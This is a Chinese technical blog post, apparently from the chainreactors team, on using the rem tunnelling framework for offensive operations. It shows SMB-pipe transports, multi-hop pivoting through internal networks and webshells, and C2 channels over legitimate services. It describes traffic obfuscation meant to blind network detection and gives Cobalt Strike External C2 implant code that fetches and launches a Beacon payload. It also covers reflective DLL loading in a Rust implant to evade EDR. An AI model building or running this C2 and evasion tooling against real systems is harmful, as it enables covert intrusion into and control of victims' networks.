## 前言

在上一部分中，我们介绍了rem的设计与实现。 而当我们完成了基础的构建，现在可以做得更多！

网络侧的对抗强度远远不如端上对抗激烈， 只需要很简单的方法就能绕过所有的设备。 rem提供了这样的潜力。

> 为了规避潜在的风险，rem-community中没有特别激进的技术，大多只提供了设计思路。 但在理解原理后， 将需求告诉cursor， 可以非常轻易的实现本文提到的所有内容。

本文将结合各种实战场景， 进一步探索rem在各个场景中的玩法。 **本文的内容涉及大量专业知识和代码，建议结合代码阅读**

## 传输层

在前文中已经介绍过rem的架构。 简单回顾一下， 任何能进行数据交换的信道都可以被封装为rem的传输层，基于此构建各种应用。 

理论上只要存在数据交换， 就能构建rem传输层， 出于性能考虑TCP/UDP之类的常见协议是最推荐的选项， 但面对一些极端场景时，我们可以基于rem的架构快速实现不同传输层的信道。 

在上文中， 我们简单介绍了传输层的定义, 实际上就是对golang原有接口的简单包装， 这是为了最大程度兼容golang生态的设计, 不进行过多抽象。 

```go
type TunnelDialer interface {  
    Dial(dst string) (net.Conn, error)  
}

type TunnelListener interface {  
    net.Listener  
    Listen(dst string) (net.Listener, error)  
}
```

也因如此， 我们只需要简单实现基本接口，就能将一个从未有人实现过的传输层实现为rem的虚拟传输层。 


我们以一个应该没有其他golang工具实现过的传输层为例， 编写一个新的传输层。 

这是基于远程SMB命名管道实现的rem传输层:

```go
func NewUnixDialer() *UnixDialer {  
    return &UnixDialer{  
       meta: make(core.Metas),  
    }  
}  
  
func (c *UnixDialer) Dial(dst string) (net.Conn, error) {  
    u, err := core.NewURL(dst)  
    if err != nil {  
       return nil, err  
    }  
    c.meta["url"] = u  
    host := u.Hostname()  
    pipePath := `\\` + host + `\pipe\` + u.PathString()  
    utils.Log.Debugf("dial pipe: %s", pipePath)  
    return winio.DialPipe(pipePath, nil)  
}  
  
func NewUnixListener() *UnixListener {  
    return &UnixListener{  
       meta: make(core.Metas),  
    }  
}  
  
func (c *UnixListener) Listen(dst string) (net.Listener, error) {  
    pipeUrl, err := core.NewURL(dst)  
    if err != nil {  
       return nil, err  
    }  
    if pipeUrl.Hostname() == "0.0.0.0" {  
       pipeUrl.SetHostname(".")  
    }  
    if pipeUrl.PathString() == "" {  
       pipeUrl.Path = "/" + c.meta["pipe"].(string)  
    }  
    pipePath := fmt.Sprintf(`\\%s\pipe\%s`, pipeUrl.Hostname(), pipeUrl.PathString())  
    c.meta["url"] = pipeUrl  
    config := &winio.PipeConfig{  
       SecurityDescriptor: "D:P(A;;GA;;;WD)", // WD 表示 Everyone，允许所有人访问  
       MessageMode:        true,              // 消息模式  
       InputBufferSize:    65536,             // 默认缓冲区大  
       OutputBufferSize:   65536,  
    }  
  
    listener, err := winio.ListenPipe(pipePath, config)  
    if err != nil {  
       return nil, err  
    }  
    utils.Log.Debugf("listen pipe: %s", pipePath)  
    c.listener = listener  
    return listener, nil  
}
```

实际上这些代码大多都是ai生成的，我只进行了输出输出的统一风格。

### 其他信道

非常有用的信道还有例如wireguard, tor,  dns(doh), unix socket, SMB 等等. 有一些在rem-community 中已经实现，其他的实现也不困难。这些信道在不同的领域有不同的用途。

在这里可以看到rem已经支持的所有信道: https://github.com/chainreactors/rem-community/tree/master/protocol/tunnel

在github 自动编译的release中只使用了tcp/udp两个最常用的信道。如果有更多的信道需求, 可以通过rem自带的条件编译工具 https://github.com/chainreactors/rem-community/blob/master/build.sh 实现。

```sh
sh ./build.sh -o "windows/amd64" -t "unix"
```

### 级联

对于攻防场景中, 难免有大量需要跨过多层网络的场景，也就是常说的级联。

在古早时期， 常通过传递式的端口转发， 例如使用lcx,ew之类的工具将代理从层层内网中转发到外部。 

一些的现代的工具的实现方式有点像C2， 例如 Stowaway, venom则会监听一个端口， 通过反连的方式在内存中进行socks5的交互， 而不是直接监听一个socks5端口。**本质上是基于多路复用协议(smux, ymux等)在内存中将一个连接复用为多个不同应用的连接。** 

rem的实现也是类似, 只不过为了去掉多路复用协议的特征(**静态特征和统计学特征**), rem自行实现一个简单的多路复用。 

示例： 假设A(外部服务器) -- B (内网边界) -- C(内网核心)

```sh
# A 
# 监听rem cnosole

./rem -a A
```

```sh
# B
# 监听服务, 并连接到A

./rem -c 'tcp://' -c '[A rem_link]' -a B
```

```sh
# C
# 通过B连接到A

./rem -c '[B rem_link]' -d A
```

!!! tips "-a 与 -d参数"
	-a参数表示当前节点别名，为空则随机生成
	-d表示目的节点名称， 为空则表示rem_link指向的节点

而在实战场景中， 还有一大类的级联需求。 

在现代网络环境中，经常会遇到不出网的内网。 大部分的解决思路都是通过icmp, dns等信道实现出网。 但需要仔细思考一下， 复杂业务真的能离开互联网独立运行么？ 

实际上大多数场景都是通过内网代理（socks5/http）等实现出网， 让业务能够访问到外部应用。 

这里的场景可以细分为：

1. 内网代理有验证， 例如打开了socks5和http的auth
2. 内网代理入方向IP白名单，需要通过横向到指定白名单搭建rem
3. 内网代理出方向IP白名单，大部分基于SNI或者Host实现校验，可以通过域前置rem或者SNI伪造搭建rem

只需要让工具支持socks5,http等协议即可实现级联。 

不过现在还有一种解决方案，在前段时间发了一篇关于golang proxyclient的文章

> [拓展golang代理的边界 proxyclient](https://chainreactors.github.io/wiki/blog/2025/02/14/proxyclient-introduce/)

里面实现了neoreg与suo5的proxy client

我们可以通过neoreg/suo5 信道搭建rem， 实现类似 https://github.com/FunnyWolf/pystinger 的功能。可以将外部的C2端口转发到内网， 或者搭建reverse proxy等等各种用途。

甚至此举还能提高neoreg/suo5的性能， 因为rem实现了多路复用，而golang的网络性能远远强于基于webshell实现的server，webshell侧只需要维护一条信道，可以最大程度利用带宽。 

示例： 假设A(外部服务器) -- B (内网边界)

```sh
# B
# 搭建rem console

./rem 
```

```sh
# A
# 通过webshell搭建rem 传输层, 搭建反向代理

./rem -c [B rem_link] --forward suo5://webshell_url/ -m proxy -l socks5://
```


### lolC2

https://lolc2.github.io/  是一个知名的基于合法服务构建C2信道的合集网站。 大致原理是通过一些原有的功能实现数据交换， 可能是评论、邮件、帖子、播放列表等等方式实现。 理论上存在数据交换就可以作为C2信道。 

对于一般C2来说， 基于lolc2实现一个信道并不困难。 但是请注意， rem是构建了一个虚拟传输层， 在这个传输层上构建了各种各样的应用（在上一篇文章中提到过如何使用ARQ协议将不可靠的信道变为可靠的信道）。

如果出于性能考虑，优先寻找能够流式传输的接口。 当然如果没有这样的接口， 也可以使用HTTP协议实现， 通过单工信道模拟双工，就像是neoreg做的一样。 

可以参考下面代码，封装了一组接口，可以将例如HTTP协议的单工信道模拟成双工信道（实际上还是单工）：

单工信道模拟双工通信:
https://github.com/chainreactors/rem-community/blob/master/x/kcp/simplex.go

基于http协议的具体实现， 将http协议模拟为双工通讯
https://github.com/chainreactors/rem-community/blob/master/x/kcp/http.go

假设有一个可信服务能交换数据，只需要根据http协议进行简单的修改， 即可构建一个基于该服务的双工通讯信道。 

## 加密混淆

对于网络侧对抗来说，数据安全不仅仅是将数据加密，还有伪装与模拟、密码学前向与后向安全、防主动探测等等细分场景。

说到流量加密混淆， 攻防场景中使用的技巧其实极为原始。 在这个领域玩出花来的还是得是某些不可说的工具。 有一些非常强大的实现可以参考， 例如：clash-core, sing-box, Xray-core。 

这个部分不便介绍的过于详细。 在长年累月的对抗中，他们甚至十年前使用的技术都可以轻松绕过目前所有厂商的NDR/态势感知等网络测设备。 

而我们要做的，将一些最基础的技巧在rem中实现，就可以让致盲任意网络侧的检测。 

rem中的wrapper分为两类， 通过是否是加密用途区分

### 加密

**加密用途的wrapper需要支持流式加密。** 

rem中只实现了非常基础的xor和AES-CFB加密。

rem在默认启动时会随机生成2-4组加密配置， 嵌套加密。 也就是rem_link中长长的那一串wrapper的配置。 

```go
func GenerateRandomWrapperOption() *WrapperOption {  
    name := AvailableWrappers[rand.Intn(len(AvailableWrappers))]  
  
    opt := &WrapperOption{  
       Name:    name,  
       Options: make(map[string]string),  
    }  
  
    switch name {  
    case AESWrapper:  
       opt.Options["key"] = utils.RandomString(32)  
       opt.Options["iv"] = utils.RandomString(16)  
    case XORWrapper:  
       opt.Options["key"] = utils.RandomString(32)  
       opt.Options["iv"] = utils.RandomString(16)  
    }  
  
    return opt  
}
```

如果有更强的密码学安全需求， 可以基于pgp/age等库自行实现。

**为了不引起不必要的误会， rem-community中只添加了最为基础的加密混淆方案。** 

### 伪装

非加密用途的wrapper， 例如padding和compress。

前者用来填充指定数据，用来模拟某些协议的协议头， 后者是用来实现数据压缩的。 


通过各种wrapper的组合， 我们可以自定义任意的流量特征。 wrapper会按照顺序依次处理数据。 


通过padding 给数据HTTP协议头 --> 实现一个gzip的压缩wrapper 

这样就能将数据伪造成http的上传下载流量。

这个功能目前没有通过命令行对外封装， 如果想要实现特定的效果， 需要结合代码实现。 
### TLS

tls是某个不可言说的领域中玩法最多的存在。 常见的玩法包括但不限于:

- tlsintls, 统计学特征消除
- uTLS , tls特征模拟
- ECH,  Encrypted Client Hello
- SNI伪造
- shadowtls
- reality

大部分厂商的网络设备对于frp，nps之类的工具识别都基于tls的加密套件和默认特征实现。 而只需要其中1-2个技术， 就能完全规避检测。 

这里的技术有一定风险， 所以rem-community中只添加了已经被披露了明显特征(只是对于某个领域有特征，对于网络侧攻防对抗并没有大多特征)的tlsintls。 其他技术可以自行研究， 实现起来并不复杂。 

## CobaltStrike联动

### Proxy

cobaltstrike的listener配置中提供了http-proxy, 可以通过rem搭建一个http_proxy, 即可将流量转发到外网。 

```
rem -c [rem_link] -m proxy -l http://:8080
```

然后在CS中配置listener即可

![](assets/Pasted%20image%2020250410000730.png)
### External C2

还有更高级的玩法. CS在早几年前就实现了一个简易的第三方信道上线的功能 externalc2.

官方文档见: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm

简单来说， 分为两个部分， implant (需自行实现)和 channel (基于rem实现)。 implant需要实现shellcode注入和pipe交互两个功能. channel负责转发流量到external listener。 

原理很简单， implant初始化后从CS的server获取stager shellcode， 执行对应shellcode， 这个stager基于SMB(pipe)通讯，implant负责将转发 pipe与channel之间的数据。

在CS中新增external C2 listener

![](assets/Pasted%20image%2020250410000957.png)

然后rem构建对应协议的应用层为CS， 可以任意选择传输层
```
./rem -c [rem_link] -m proxy -l cs://:12345 -r raw://
```

implant需要自行实现，我让ai生成了一段简单的代码

```C
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        return;
    }

    /* 创建 socket */
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("socket failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }
    /* 配置服务器地址 */

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(26019); // 指定端口，例如 12345
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // 指定 IP，例如本地 127.0.0.1
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("connect failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }
    
    /* 从 socket 获取 payload */
    char *srvpayload = malloc(PAYLOAD_MAX_SIZE);
    if (!srvpayload) {
        printf("malloc failed\n");
        closesocket(sock);
        WSACleanup();
        return;
    }
    int srvpayloadLen = read_frame_sock(sock, srvpayload, PAYLOAD_MAX_SIZE);;

    /* 启动 Beacon */
    HANDLE handle_beacon = start_beacon(srvpayload, srvpayloadLen);
```

![](assets/Pasted%20image%2020250409235950.png)

这样就可以复用刚才提过的rem实现的各种隐蔽的流量侧特性与多协议传输层。 大大拓展了原本CS只支持DNS、HTTP、TCP的三种传输层。


## 嵌入到rust implant中

如果了解我们在开发的另一个项目 下一代进攻性基础设施---Internal of Malice 应该早已看到IoM的tunnel/proxy 相关功能都交由rem实现。 

而rem是基于golang开发的， golang在这一块的生态完整度远超rust。 那么，该如何打通rem与IoM的交互呢？

传统的做法，上传然后执行二进制程序，又或者将其打包成dll/so随着implant投递。 

对于IoM来说， IoM提供了反射动态加载dll以及反射加载PE等等功能， 我们可以基于我们的进攻性基础设施， 完成更加OPSEC的加载。 

### 方法1 反射加载EXE程序

rust implant的execute_exe 能完美加载rem， 就像在本地使用一样。 

```
execute_exe rem.exe -- -c [rem_link] ... 
```

缺点是会派生新进程， 在核晶或者EDR场景中， 会留下暴露面。 

### 方法2 动态加载dll

先将rem打成dll， 这里需要用到Cgo， 跨语言的互操作如果语言没有提供特殊的机制， 大多基于FFI实现。 

这段代码暴露了一个类似命令行程序的函数， 能接收字符串， 并解析参数执行rem。 

https://github.com/chainreactors/rem-community/blob/master/cmd/export/main.go

```go
//export RemDial
func RemDial(cmdline *C.char) (*C.char, C.int) {
	var option runner.Options
	args, err := shellquote.Split(C.GoString(cmdline))
	if err != nil {
		utils.Log.Debugf("RemDial error: failed to split command line: %v", err)
		return nil, 1 // 错误ID 1: 命令行解析错误
	}

	err = option.ParseArgs(args)
	if err != nil {
		utils.Log.Debugf("RemDial error: failed to parse arguments: %v", err)
		return nil, 2 // 错误ID 2: 参数解析错误
	}

	......

	// 启动一个新的goroutine来处理agent
	go func() {
		err := a.Handler()
		if err != nil {
			utils.Log.Error(err)
		}
		agent.Agents.Map.Delete(a.ID)
	}()

	for {
		if a.Init {
			break
		} else {
			time.Sleep(100 * time.Millisecond)
		}
	}

	return C.CString(a.ID), 0 // 成功，返回agent ID
}
```

```bash
go build -buildmode=c-shared -o dist/rem.dll -ldflags "-s -w" -buildvcs=false .\cmd\export\
```

这个是FFI的公头， 在rust中实现对应的母头， 但是略微不同的是， 我们不会采用原始的加载DLL的方式，而是更加OPSEC的反射加载。 
https://github.com/chainreactors/malefic/blob/master/malefic-helper/src/common/rem/rem_reflection.rs

```rust
#[cfg(target_os = "windows")]  
#[cfg(feature = "prebuild")]  
pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {  
    use crate::win::kit::{MaleficLoadLibrary, AUTO_RUN_DLL_MAIN, LOAD_MEMORY};  
  
    if bins.is_empty() || bundle.is_empty() {  
        return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));  
    }  
    let new_bundle = format!("{}{}", bundle, "\x00");  
    let dark_module = MaleficLoadLibrary(  
        AUTO_RUN_DLL_MAIN | LOAD_MEMORY as u32,  
        null(),  
        bins.as_ptr() as _,  
        bins.len(),  
        new_bundle.as_ptr() as _,  
    ) as _;  
  
    Ok(dark_module)  
}

#[cfg(target_os = "windows")]  
#[cfg(feature = "prebuild")]  
pub unsafe fn get_function_address(module_base: *const c_void, function_name: &str) -> *const c_void {  
    use crate::win::kit::MaleficGetFuncAddrWithModuleBaseDefault;  
  
    MaleficGetFuncAddrWithModuleBaseDefault(  
        module_base,  
        function_name.as_ptr(),  
        function_name.len(),  
    )  
}


// 反射加载dll并解析对应的函数
unsafe fn initialize_functions() -> Result<(), String> {  
    let dll_bytes = REM_DLL  
        .get()  
        .ok_or("REM not initialize, please load rem.dll")?;  
  
    let module = load_module(dll_bytes.clone(), String::from("rem"))  
        .map_err(|e| format!("Failed to load module: {:?}", e))?;  
  
    if module.is_null() {  
        return Err("Failed to load module: module is null".to_string());  
    }  
  
    let module_base = module as *const _;  
  
    // 获取各个函数的地址  
    let rem_dial_addr = get_function_address(module_base, "RemDial");  
    if rem_dial_addr.is_null() {  
        return Err("Failed to get RemDial function".to_string());  
    }  
    REM_FUNCTIONS.rem_dial = Some(std::mem::transmute(rem_dial_addr));
	Ok(())
}
```
对应工具函数已经在IoM中实现， 也可以将其他FFI程序通过类似的方法实现。

暴露REM函数
```rust
extern "C" {
    fn RemDial(cmdline: *const c_char) -> (*mut c_char, c_int);
    fn MemoryDial(memhandle: *const c_char, dst: *const c_char) -> (c_int, c_int);
    fn MemoryRead(handle: c_int, buf: *mut c_void, size: c_int) -> (c_int, c_int);
    fn MemoryWrite(handle: c_int, buf: *const c_void, size: c_int) -> (c_int, c_int);
    fn MemoryClose(handle: c_int) -> c_int;
    fn CleanupAgent();
}
```

对于使用者来说， 不需要关注这些细节， 相关代码已经在[IoM的插件仓库]https://github.com/chainreactors/mal-community/blob/master/community-proxy/modules/rem.lua ()中完成了对应的封装。

在IoM命令行中执行以下代码即可安装并使用rem
```sh
# 安装对应的插件
mal install community-proxy

# 加载rem dll
rem_community load

# 选择对应的rem pipeline, 搭建了反向代理隧道
rem_community socks5 rem_pipeline
```

这个方法比`execute-exe`好的地方在于， 不会有新进程fork， 一切都在当前进程中完成。 

### 方法3 静态链接rem

方法1和2都是解决上线后进一步搭建proxy/tunnel，要想让implant直接通过rem搭建的信道进行所有通讯，还需要一些技巧。 

使用刚刚实现的rem的/cmd/export/main.go , 只需要修改下编译命令， 就能生成静态链接库给rust使用。

```bash
go build -buildmode=c-archive -o dist/rem.a -ldflags "-s -w" -buildvcs=false .\cmd\export\
```

在rust中实现对应的链接, 复用方法2中的rust定义即可。 

https://github.com/chainreactors/malefic/blob/master/malefic-helper/build.rs
```rust
#[cfg(feature = "rem_static")]  
{  
    let resources_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))  
        .parent()  
        .unwrap()  
        .join("resources");  
  
    let target_os = env::var("CARGO_CFG_TARGET_OS").unwrap();  
    let target_arch = env::var("CARGO_CFG_TARGET_ARCH").unwrap();  
      
    let rem_config = LibraryConfig::new(  
        "REM",  
        vec!["windows", "linux"],  
        vec!["x86_64"],  
        "librem_community_{os}_{arch}.a",  
        vec!["ws2_32", "userenv"],  
    );  
  
    if let Err(e) = rem_config.link_library(&resources_path, &target_os, &target_arch) {  
        panic!("{}", e);  
    }  
}
```

实现对应的implant transport，见: https://github.com/chainreactors/malefic/blob/master/malefic-core/src/transport/rem/mod.rs

对于使用者来说， 修改implant 的config.yaml

```yaml
basic:  
  name: "malefic"  
  targets:  
    - "127.0.0.1:5001"  
  protocol: "rem"  
  tls: false  
  proxy: ""  
  interval: 5  
  jitter: 0.2  
  ca:  
  encryption: aes  
  key: maliceofinternal  
  rem:  
    link: '[rem_link]'
```

运行mutant生成编译配置并编译

```bash
malefic-mutant generate beacon

cargo build --release -p malefic
```

## 结语

rem实际上已经重构了4次，不断的拓展能力的边界， 已经不是一个单纯的代理工具，而是开发框架。 

在发布时， 我考虑了很长时间如何去掉一些具有过强攻击性的能力又不影响其架构。目前发布的版本包含了所有的基本功能，但在一些特殊的模块上没有对外暴露或者需要手动配置又或者需要简单二开(cursor就可以完美胜任)。 

网络侧的攻防也不仅限于本文提到的内容， 实际上还有更多的玩法和思路。